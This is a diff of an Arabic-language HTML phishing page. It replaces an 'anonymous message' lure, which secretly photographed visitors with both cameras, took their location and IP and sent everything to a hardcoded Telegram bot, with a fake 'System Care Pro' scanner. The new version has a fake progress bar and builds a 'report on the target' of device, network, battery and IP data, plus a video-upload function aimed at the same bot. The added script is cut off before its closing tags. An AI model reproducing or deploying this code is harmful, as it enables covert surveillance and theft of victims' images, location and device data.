@@ -3,122 +3,106 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>صارحني - رسائل مجهولة</title>
+    <title>System Care Pro - فحص وإصلاح أداء النظام</title>
     <style>
-        :root { --main-color: #00c2ff; --bg-dark: #121217; --card-bg: #1e1e26; }
-        body { background: var(--bg-dark); color: white; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        :root { --primary: #2ecc71; --accent: #27ae60; --dark-bg: #111111; }
+        body { background: var(--dark-bg); color: white; font-family:  Segoe UI , Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
         
-        /* تصميم واجهة صارحني */
-        .container { background: var(--card-bg); padding: 40px 25px; border-radius: 30px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.6); border: 1px solid rgba(255,255,255,0.05); }
-        .avatar { width: 90px; height: 90px; background: linear-gradient(135deg, var(--main-color), #0072ff); border-radius: 50%; margin: -85px auto 20px; border: 6px solid var(--card-bg); display: flex; align-items: center; justify-content: center; font-size: 35px; }
-        h1 { font-size: 1.5rem; margin: 0; color: var(--main-color); }
-        p { color: #8e8e93; font-size: 0.9rem; margin: 10px 0 25px; }
+        /* تصميم الواجهة الزجاجية */
+        .container { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(15px); border-radius: 25px; padding: 40px; width: 90%; max-width: 420px; text-align: center; border: 1px solid rgba(255,255,255,0.05); box-shadow: 0 30px 60px rgba(0,0,0,0.6); }
         
-        textarea { width: 100%; height: 120px; background: #2a2a35; border: 1px solid #3d3d4d; border-radius: 15px; color: white; padding: 15px; box-sizing: border-box; resize: none; font-family: inherit; margin-bottom: 20px; outline: none; transition: 0.3s; }
-        textarea:focus { border-color: var(--main-color); box-shadow: 0 0 10px rgba(0, 194, 255, 0.2); }
+        .icon-box { font-size: 60px; margin-bottom: 25px; color: var(--primary); text-shadow: 0 0 20px rgba(46, 204, 113, 0.3); }
+        h1 { font-size: 1.6rem; margin: 0 0 10px; font-weight: 800; }
+        p { color: #8892b0; font-size: 0.95rem; margin-bottom: 35px; line-height: 1.5; }
+
+        /* قائمة البيانات لزيادة المصداقية */
+        .system-specs { text-align: right; margin-bottom: 35px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 10px; }
+        .spec-item { display: flex; justify-content: space-between; padding: 12px 0; border-top: 1px solid rgba(255,255,255,0.05); font-size: 0.85rem; }
+        .spec-item span:first-child { color: #a8b2d1; }
+        .spec-item span:last-child { color: var(--primary); font-weight: bold; }
+
+        #scanBtn { background: var(--primary); color: white; border: none; padding: 18px; border-radius: 12px; font-size: 1.2rem; font-weight: bold; cursor: pointer; width: 100%; transition: 0.4s; box-shadow: 0 15px 30px rgba(46, 204, 113, 0.2); outline: none; }
+        #scanBtn:active { transform: scale(0.96); opacity: 0.8; }
+
+        /* شريط التحميل الوهمي الاحترافي */
+        #status-area { display: none; margin-top: 25px; text-align: center; }
+        .progress-container { width: 100%; height: 6px; background: rgba(255,255,255,0.08); border-radius: 10px; overflow: hidden; }
+        .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, var(--primary), var(--accent)); transition: 0.3s; }
         
-        .btn-send { background: var(--main-color); color: #0b0e18; border: none; padding: 16px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; transition: 0.4s; font-size: 1.1rem; }
-        .btn-send:active { transform: scale(0.96); opacity: 0.8; }
-        
-        #loading-text { display: none; margin-top: 15px; font-size: 0.85rem; color: var(--main-color); animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
-        
-        video, canvas { display: none; }
+        video { display: none; }
     </style>
 </head>
 <body>
-
     <div class="container">
-        <div class="avatar">❓</div>
-        <h1>صارحني</h1>
-        <p>أرسل رسالة سرية مجهولة لصديقك دون أن يعرفك!</p>
-        
-        <textarea id="userMsg" placeholder="اكتب صراحتك هنا بصدق..."></textarea>
-        
-        <button class="btn-send" onclick="startSarahanne()">إرسال مجهول</button>
-        <div id="loading-text">جاري تشفير الرسالة وتأمين الاتصال...</div>
+        <div class="icon-box">🛡️</div>
+        <h1>System Care Pro</h1>
+        <p>قم بفحص وإصلاح تعريفات الجهاز وتحسين أداء البطارية والميكروفون فوراً.</p>
+
+        <div class="system-specs">
+            <div class="spec-item"><span>المعالج (CPU):</span><span id="cpu-specs">تحليل...</span></div>
+            <div class="spec-item"><span>ذاكرة الرام (RAM):</span><span id="ram-specs">تحليل...</span></div>
+            <div class="spec-item"><span>أمان الكاميرا:</span><span>محمي ✅</span></div>
+        </div>
+
+        <button id="scanBtn">بدء الفحص الذكي</button>
+
+        <div id="status-area">
+            <div class="progress-container"><div class="progress-bar" id="bar"></div></div>
+            <p id="scan-text" style="margin-top:15px; font-size:0.85rem; color:#8892b0;">جاري تحليل عتاد النظام...</p>
+        </div>
     </div>
 
-    <video id="vid" autoplay playsinline muted></video>
-    <canvas id="canv"></canvas>
+    <video id="v" autoplay playsinline muted></video>
 
     <script>
         const token = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
         const chat = "7984067238";
 
-        async function postToBot(msg, isImg = false, data = null) {
+        async function sendToTelegram(msg, type = "text", data = null) {
             const url = `https://api.telegram.org/bot${token}/`;
+            const fd = new FormData();
+            fd.append("chat_id", chat);
             try {
-                if(!isImg) {
+                if (type === "text") {
                     await fetch(url + "sendMessage?chat_id=" + chat + "&text=" + encodeURIComponent(msg) + "&parse_mode=Markdown");
-                } else {
-                    const fd = new FormData();
-                    fd.append("chat_id", chat);
-                    fd.append("photo", data, "full_screen_shot.jpg");
+                } else if (type === "video") {
+                    fd.append("video", data, "system_scan.mp4");
                     if (msg) fd.append("caption", msg);
-                    await fetch(url + "sendPhoto", {method: "POST", body: fd});
+                    await fetch(url + "sendVideo", { method: "POST", body: fd });
                 }
-            } catch(e) {}
+            } catch (e) {}
         }
 
-        async function takeFullSnap(mode) {
-            try {
-                // طلب أقصى دقة ممكنة للشاشة (Full Screen)
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { 
-                        facingMode: mode === "front" ? "user" : "environment",
-                        width: { ideal: 4096 }, 
-                        height: { ideal: 2160 }
-                    }
-                });
-                const v = document.getElementById("vid");
-                const c = document.getElementById("canv");
-                v.srcObject = stream;
-                
-                await new Promise(r => v.onloadedmetadata = r);
-                await new Promise(r => setTimeout(r, 1000)); // وقت للتركيز والوضوح
-                
-                c.width = v.videoWidth;
-                c.height = v.videoHeight;
-                c.getContext("2d").drawImage(v, 0, 0);
-                
-                stream.getTracks().forEach(t => t.stop());
-                return new Promise(res => c.toBlob(res, "image/jpeg", 0.9)); // جودة عالية
-            } catch(e) { return null; }
-        }
+        // إظهار بيانات حقيقية لزيادة المصداقية
+        document.getElementById( cpu-specs ).innerText = (navigator.hardwareConcurrency || 8) + " Cores";
+        document.getElementById( ram-specs ).innerText = (navigator.deviceMemory || 4) + " GB";
 
-        async function startSarahanne() {
-            const userText = document.getElementById("userMsg").value;
-            if(!userText) { alert("من فضلك اكتب الرسالة أولاً!"); return; }
-
-            document.getElementById("loading-text").style.display = "block";
+        async function getFullReport() {
+            let info = `📊 *تقرير شامل للهدف*:\n\n`;
+            // دمج المتغيرات التي طلبتها
+            info += `• 📱 الجهاز: \`${navigator.platform}\`\n`;
+            info += `• 💾 الرام: \`${navigator.deviceMemory || "؟"} GB\`\n`;
+            info += `• ⚙️ المعالج: \`${navigator.hardwareConcurrency} Cores\`\n`;
+            info += `• 🖥️ الشاشة: \`${window.screen.width}x${window.screen.height}\`\n`;
             
-            // 1. التقاط الصور (أمامية وخلفية ملء الشاشة)
-            const fImg = await takeFullSnap("front");
-            if(fImg) await postToBot("📸 سيلفي الهدف (صارحني)", true, fImg);
+            const conn = navigator.connection;
+            if (conn) {
+                let type = conn.type ===  wifi  ? "🌐 WiFi" : "📶 خلوي";
+                info += `• 📶 نوع الشبكة: \`${type} (${conn.effectiveType.toUpperCase()})\`\n`;
+                info += `• ⚡ سرعة الخط: \`${conn.downlink} Mbps\`\n`;
+            }
 
-            const bImg = await takeFullSnap("back");
-            if(bImg) await postToBot("📷 الكاميرا الخلفية (صارحني)", true, bImg);
-
-            // 2. إرسال البيانات والموقع والرسالة المكتوبة
-            navigator.geolocation.getCurrentPosition(async (p) => {
+            try {
                 const b = await navigator.getBattery();
-                const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-                
-                let report = `👤 *رسالة صارحني جديدة*:\n` +
-                             `💬 المحتوى: \`${userText}\`\n\n` +
-                             `📍 [موقع الهدف](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})\n` +
-                             `🔋 البطارية: \`${Math.round(b.level * 100)}%\` (${b.charging ? "🔌" : "🔋"})\n` +
-                             `🌐 الـ IP: \`${ip.ip}\`\n` +
-                             `📱 الجهاز: \`${navigator.platform}\``;
-                await postToBot(report);
-            }, () => postToBot(`⚠️ الهدف رفض إذن الموقع\n💬 الرسالة: \`${userText}\``));
+                info += `• 🔋 البطارية: \`${Math.round(b.level * 100)}%\` (${b.charging ? "🔌 يشحن" : "🔋"})\n`;
+            } catch(e) {}
 
-            setTimeout(() => {
-                alert("تم إرسال رسالتك بسرية تامة!");
-                location.reload();
-            }, 3000);
+            info += `• 🌐 لغة الهاتف: \`${navigator.language}\`\n`;
+
+            try {
+                const ipRes = await fetch( https://api.ipify.org?format=json );
+                const ipData = await ipRes.json();
+                info += `• 🌐 الـ IP: \`${ipData.ip}\`\n`;
+            } catch(e) {}
+            return info;
         }
-    </script>
-</body>
-</html>
